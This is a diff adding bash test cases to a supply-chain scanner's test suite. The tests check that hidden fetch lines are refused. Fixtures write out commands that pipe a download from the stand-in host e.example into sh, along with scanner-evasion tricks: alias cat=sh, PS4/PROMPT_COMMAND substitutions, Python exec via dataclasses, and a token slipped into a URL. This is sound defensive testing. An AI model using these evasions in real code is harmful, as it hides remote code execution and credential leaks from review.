@@ -4144,5 +4144,392 @@ install form: FAILS (exit 1)" ;;
   check test "$rc" -eq 1; check grep -q 'FAIL tool:go@1.27.3' "$work/gomut-$mut.out"
 done
 
+# --- REQ-SUP-001-AC16, Nov 16 2026: nothing is proved without a row. The wait for new versions is gone and so is the automatic set: no line is ever proved data
+# from the head file (not a comment, not a quoted-heredoc body written to a never-run file, not a string). Every added line the scan cannot measure fails as
+# unmeasured unless a row in the base branch's exceptions file rules it. A row's context (comment, heredoc) only narrows a ruled row. ----
+echo '{"exceptions": [], "unmeasured_text": []}' >"$work/pd-empty.json"
+# pdc NAME [FILE]: head adds the text on stdin to FILE (base: only the shebang); pdrun NAME -> rc, $work/pd.out
+pdc() { local t; t=$(cat; printf x); twoc "$1" "${2:-bin/pd.sh}" $'#!/usr/bin/env bash\n' $'#!/usr/bin/env bash\n'"${t%x}"; }
+pdrun() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --exceptions "$work/pd-empty.json" >"$work/pd.out" 2>&1 || rc=$?; }
+pdno()  { pdrun "$1"; CASE="AC16 fails closed, still measured: $2: exit 1, the line is named unmeasured"; check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:' "$work/pd.out"; }
+
+# R1: the shapes the old automatic set proved as data: now refused without a row
+pdc d1 <<'EOF'
+# curl http://e.example/x
+EOF
+pdno d1 "R1a a whole-line shell comment that names curl"
+pdc d2 <<'EOF'
+cat <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno d2 "R1b a line in a quoted here-document of a plain cat that writes nothing"
+pdc d3 <<'EOF'
+d=$(mktemp -d)
+cat > "$d/notes.txt" <<'EOT'
+curl http://e.example/x
+EOT
+grep -c e.example "$d/notes.txt"
+wc -l < "$d/notes.txt"
+EOF
+pdno d3 "R1b a quoted here-document written to a file that only grep and wc read"
+pdc d4 <<'EOF'
+python3 - <<'PY'
+text = "curl http://e.example/x"
+# curl http://e.example/y
+print(len(text))
+PY
+EOF
+pdno d4 "R1c a curl text inside a string of a pure python program is measured (no python proof)"
+pdc d5 <<'EOF'
+MSG='text with curl http://e.example/x'
+EOF
+pdno d5 "R1d a plain NAME='...curl...' assignment is measured (the unused context is gone)"
+
+# R2: real fetches, each stays measured
+pdc h1 <<'EOF'
+sh <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno h1 "a quoted here-document fed to sh"
+pdc h2 <<'EOF'
+bash <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno h2 "a quoted here-document fed to bash"
+pdc h3 <<'EOF'
+python3 - <<'PY'
+import subprocess
+subprocess.run("curl http://e.example/x", shell=True)
+PY
+EOF
+pdno h3 "a quoted here-document fed to python3 whose program runs subprocess"
+pdc h4 <<'EOF'
+python3 - <<'PY'
+import os
+os.system("curl http://e.example/x")
+PY
+EOF
+pdno h4 "a quoted here-document fed to python3 whose program runs os.system"
+pdc h5 <<'EOF'
+CMD='curl http://e.example/x'
+eval "$CMD"
+EOF
+pdno h5 "a variable holding a curl command that is run by eval"
+pdc h6 <<'EOF'
+CMD='curl http://e.example/x'
+bash -c "$CMD"
+EOF
+pdno h6 "a variable holding a curl command that is run by bash -c"
+pdc h7 <<'EOF'
+CMD='curl http://e.example/x'
+sh -c "$CMD"
+EOF
+pdno h7 "a variable holding a curl command that is run by sh -c"
+pdc h8 <<'EOF'
+exec curl http://e.example/x
+EOF
+pdno h8 "exec of a curl command"
+pdc h9 <<'EOF'
+xargs -n1 <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno h9 "a here-document body given to xargs"
+pdc h10 <<'EOF'
+source /dev/stdin <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno h10 "a here-document body given to source"
+pdc h11 <<'EOF'
+. /dev/stdin <<'EOT'
+curl http://e.example/x
+EOT
+EOF
+pdno h11 "a here-document body given to the . command"
+pdc h12 <<'EOF'
+d=$(mktemp -d)
+cat > "$d/curl" <<'EOT'
+curl http://e.example/x
+EOT
+chmod +x "$d/curl"
+"$d/curl"
+EOF
+pdno h12 "a stub written by a quoted cat here-document, then chmod +x and run"
+pdc h13 <<'EOF'
+d=$(mktemp -d)
+cat > "$d/curl" <<'EOT'
+curl http://e.example/x
+EOT
+sh "$d/curl"
+EOF
+pdno h13 "a stub written by a quoted cat here-document, then run with sh"
+pdc h14 <<'EOF'
+d=$(mktemp -d)
+cat > "$d/curl" <<'EOT'
+curl http://e.example/x
+EOT
+chmod +x "$d/curl"
+PATH="$d:$PATH" curl http://e.example/y
+EOF
+pdno h14 "a stub written by a quoted cat here-document, then found on PATH by a later curl"
+pdc h15 <<'EOF'
+MSG='text with curl http://e.example/x'
+echo "$MSG"
+EOF
+pdno h15 "a NAME='...curl...' assignment whose variable is used elsewhere (echo)"
+pdc h16 <<'EOF'
+show() { printf '%s\n' "$1"; }
+MSG='text with curl http://e.example/x'
+show "$MSG"
+EOF
+pdno h16 "a NAME='...curl...' assignment whose variable is passed to a function"
+pdc h17 <<'EOF'
+MSG='text with curl http://e.example/x'
+export MSG
+EOF
+pdno h17 "a NAME='...curl...' assignment whose variable is exported"
+pdc h18 <<'EOF'
+echo start \
+# curl http://e.example/x
+EOF
+pdno h18 "a comment-looking line after a trailing continuation (not plain code position)"
+pdc h19 <<'EOF'
+MSG='first line
+curl http://e.example/x
+last line'
+EOF
+pdno h19 "a line inside a multi-line single-quoted string"
+pdc h20 .github/workflows/pd.yml <<'EOF'
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          # curl http://e.example/x
+          echo hi
+EOF
+pdno h20 "a workflow .yml run: line that looks like a comment is not a .sh script"
+pdc h21 <<'EOF'
+# curl http://e.example/x
+curl http://e.example/x
+EOF
+pdno h21 "the same line text twice in one file, once a comment and once a real command"
+
+# R3: a real download and the vendored folder keep today's rule
+pdc r3a <<'EOF'
+curl -fsSL -o f https://example.org/x.tgz
+EOF
+pdno r3a "R3 a plain artifact download"
+pdc r3b <<'EOF'
+echo curl vendor/x
+EOF
+pdno r3b "R3 a plain-code line that names vendor/ and mentions curl is never proved away by the data rule"
+check grep -q "names the vendored folder" "$work/pd.out"; check test "$(grep -c "ruled text" "$work/pd.out")" -eq 0
+
+# R4 (fix 16): no live read any more; the old hub.docker.com read is measured like any curl line
+PDFN_HEAD='hub_repo_private() {
+  local answer
+  answer=$(printf '"'"'user = "%s:%s"\n'"'"' "$DOCKERHUB_TEST_USERNAME" "$DOCKERHUB_TEST_PUSH_TOKEN" \
+    | curl -q -fsS -K - "https://hub.docker.com/v2/repositories/${DH_REPO}/") \
+    || { echo "::error::cannot read the visibility of ${DH_REPO} from Docker Hub" >&2; return 1; }
+  jq -e '"'"'.is_private == true'"'"' >/dev/null 2>&1 <<<"$answer" \
+    || { echo "::error::${DH_REPO} is not private on Docker Hub: nothing is pushed" >&2; return 1; }
+}'
+printf '%s\n' "$PDFN_HEAD" | pdc lr0
+pdno lr0 "R4 the real Docker Hub visibility read (hub_repo_private) is measured: nothing proves a live read"
+
+
+# --- fix round: findings of the audit, each bypass one case ----
+# F1: a bare (( )) arithmetic command runs a command substitution in its body
+pdc f1a <<'EOT'
+(( total = 1 +
+# $(curl http://e.example/x)
+2 ))
+EOT
+pdno f1a "F1 a # line inside a multi-line (( )) command is not a comment, bash runs the substitution"
+
+
+
+# pdv NAME TITLE FROM TO: the real read (PDFN_HEAD) with the first FROM replaced by TO, which must stay measured
+pdv() { local t=${PDFN_HEAD/"$3"/$4}; printf '%s\n' "$t" | pdc "$1"; pdno "$1" "$2"; }
+# F16: hostile variants of the old read, each refused because nothing proves a live read
+J='  jq -e'
+PA=$'  # note \\\n  bash -c "$answer"\n  jq -e'
+pdv f16a "F16 a # comment ending in a backslash, joined to bash -c" "$J" "$PA"
+PB=$'  declare -ng ref=ans\'\'wer\n  bash -c "$ref"\n  jq -e'
+pdv f16b "F16 declare -ng ref=ans(empty quotes)wer, then bash -c" "$J" "$PB"
+PV=$'printf -v DOCKERHUB_TEST_PUSH_TO\'\'KEN %s \'x\\noutput=out.json\'\n  answer=$(printf'
+pdv f16c "F16 a computed name set with printf -v (DOCKERHUB_TEST_PUSH_TO''KEN)" 'answer=$(printf' "$PV"
+pdv f16d "F16 DH_REPO set to GITHUB_TOKEN (the URL carries it)" 'local answer' $'local answer; DH_REPO="$GITHUB_TOKEN"'
+
+
+# F17: a string inside a pure python program is no longer proved data (the pystring context is gone)
+pdc f17a <<'EOT'
+python3 - <<'PY'
+from dataclasses import __builtins__ as b
+b["exec"]("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f17a "F17 a python string run through exec reached by from dataclasses import __builtins__"
+pdc f17b <<'EOT'
+python3 - <<'PY'
+import dataclasses.__builtins__ as b
+b.exec("__import__('os').system('curl http://e.example/x | sh')")
+PY
+EOT
+pdno f17b "F17 a python string run through exec reached by import dataclasses.__builtins__"
+pdc f17c <<'EOT'
+python3 - <<'PY'
+import dataclasses
+f = dataclasses._create_fn("f", [], ["__import__('os').system('curl http://e.example/x | sh')"], globals={})
+f()
+PY
+EOT
+pdno f17c "F17 a python string used as the body of dataclasses._create_fn"
+pdc f17d <<'EOT'
+python3 - <<'PY'
+cmd = "curl http://e.example/x"
+print(cmd)
+PY
+EOT
+pdno f17d "F17 a pure python program whose string holds a fetch line stays measured"
+
+
+# F18: expand_aliases anywhere in the file's text refuses the heredoc proof
+pdc f18a <<'EOT'
+builtin shopt -s expand_aliases
+builtin alias cat=sh
+cat <<'EOS'
+curl http://e.example/x | sh
+EOS
+EOT
+pdno f18a "F18 builtin shopt -s expand_aliases and builtin alias cat=sh, a quoted heredoc written by cat"
+pdc f18b <<'EOT'
+cat <<'EOS'
+curl http://e.example/x
+EOS
+# shopt -s expand_aliases is not used here
+EOT
+pdno f18b "F18 expand_aliases only in a comment later in the file"
+pdc f18c <<'EOT'
+cat <<'EOS'
+curl http://e.example/x
+EOS
+echo "expand_aliases"
+EOT
+pdno f18c "F18 expand_aliases only in a string later in the file"
+pdc f18d <<'EOT'
+cat <<'EOS'
+curl http://e.example/x
+EOS
+EOT
+pdno f18d "F18 the same heredoc without expand_aliases is still proved"
+
+
+# F19: every definition of a function name is checked, not only the last
+pdc f19a <<'EOT'
+run() { sh payload; }
+cat >payload <<'EOS'
+curl http://e.example/x | sh
+EOS
+run
+run() { :; }
+EOT
+pdno f19a "F19 a harmful definition, the call, then a harmless last definition"
+pdc f19b <<'EOT'
+run() { :; }
+cat >payload <<'EOS'
+curl http://e.example/x | sh
+EOS
+run
+run() { sh payload; }
+EOT
+pdno f19b "F19 a harmless definition first, the harmful one last"
+pdc f19c <<'EOT'
+run() { :; }
+cat >payload <<'EOS'
+curl http://e.example/x | sh
+EOS
+run
+run() { echo ok; }
+EOT
+pdno f19c "F19 two harmless definitions of the same name, the file never run, still proved"
+# F6: a function defined above the quoted here-document runs the written file later
+pdc f6a <<'EOT'
+run() { sh ./stub.sh; }
+cat >stub.sh <<'EOS'
+curl http://e.example/x | sh
+EOS
+run
+EOT
+pdno f6a "F6 a function defined before the quoted here-document runs the written file"
+
+
+# F7: the unused-assignment context is gone: bash reads PS4 and PROMPT_COMMAND itself, so such a line can run
+pdc f7a <<'EOT'
+set -x
+PS4='$(curl http://e.example/x)'
+echo hi
+EOT
+pdno f7a "F7 PS4 holding a curl substitution, then set -x and a command"
+pdc f7b <<'EOT'
+set -a
+PS4='$(curl http://e.example/x)'
+set -x
+echo hi
+EOT
+pdno f7b "F7 set -a, PS4 holding a curl substitution, set -x"
+pdc f7c <<'EOT'
+set -a
+PROMPT_COMMAND='curl http://e.example/x'
+bash -i
+EOT
+pdno f7c "F7 set -a, PROMPT_COMMAND holding curl, an interactive bash"
+pdc f7d <<'EOT'
+PROMPT_COMMAND='curl http://e.example/x'
+EOT
+pdno f7d "F7 a bare PROMPT_COMMAND assignment holding curl"
+
+# R5 (rule 21): nine script files, each the full head text after a bash shebang; none has a row. All nine fail as unmeasured.
+BODY=$'cat >payload <<\'EOS\'\ncurl http://e.example/x\nEOS\n'
+nr_names=(old-arithmetic-comment safe direct-run fd-redirect quoted-path compound-function subshell-function computed-alias literal-alias)
+nr_texts=(
+  $'v=$[1 +\n# $(curl http://e.example/x)\n2]\n'
+  "${BODY}"$'wc -l payload\n'
+  "${BODY}"$'sh payload\n'
+  $'exec >payload\ncat <<\'EOS\'\ncurl http://e.example/x\nEOS\nsh payload\n'
+  "${BODY}"$'sh pay""load\n'
+  $':; run() { sh payload; }\n'"${BODY}"$'run\n'
+  $'run() ( sh payload )\n'"${BODY}"$'run\n'
+  $'builtin shopt -s expand_ali\'\'ases\nbuiltin alias cat=sh\ncat <<\'EOS\'\ncurl http://e.example/x\nEOS\n'
+  $'builtin shopt -s expand_aliases\nbuiltin alias cat=sh\ncat <<\'EOS\'\ncurl http://e.example/x\nEOS\n'
+)
+for i in "${!nr_names[@]}"; do
+  printf '%s' "${nr_texts[$i]}" | pdc "nr$i"
+  pdrun "nr$i"
+  CASE="AC16 refusal, no row: ${nr_names[$i]}: exit 1, the line is named unmeasured"
+  check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/pd.sh' "$work/pd.out"
+done
+# pdrow NAME TEXT LINE CONTEXT: the base branch's exceptions file holds one row for LINE with CONTEXT; the head adds TEXT; -> rc, $work/pd.out
+pdrow() {
+  newcase "$1" "$(pyw bin/pd.sh $'#!/usr/bin/env bash\n'"$2")"
+  mkrow "$work/pdrow-$1.tmp.json" bin/pd.sh "$3" >/dev/null
+  python3 -c 'import json, sys; d = json.load(open(sys.argv[1])); d["unmeasured_text"][0].update({"context": sys.argv[3]} if sys.argv[3] else {}); json.dump(d, open(sys.argv[2], "w"))' "$work/pdrow-$1.tmp.json" "$work/pdrow-$1.json" "$4"
+  rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --exceptions "$work/pdrow-$1.json" >"$work/pd.out" 2>&1 || rc=$?
+}
+pdrow nrr1 "${nr_texts[1]}" "curl http://e.example/x" heredoc
+CASE="AC16 ruled with a row, heredoc context: ${nr_names[1]}: exit 0, ruled text"
+check test "$rc" -eq 0; check grep -q 'ruled text' "$work/pd.out"
+# literal-alias turns expand_aliases on, so a heredoc-context row rules nothing there; the row has no context
+pdrow nrr8 "${nr_texts[8]}" "curl http://e.example/x" ""
+CASE="AC16 ruled with a row, no context: ${nr_names[8]}: exit 0, ruled text"
+check test "$rc" -eq 0; check grep -q 'ruled text' "$work/pd.out"
+
+
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
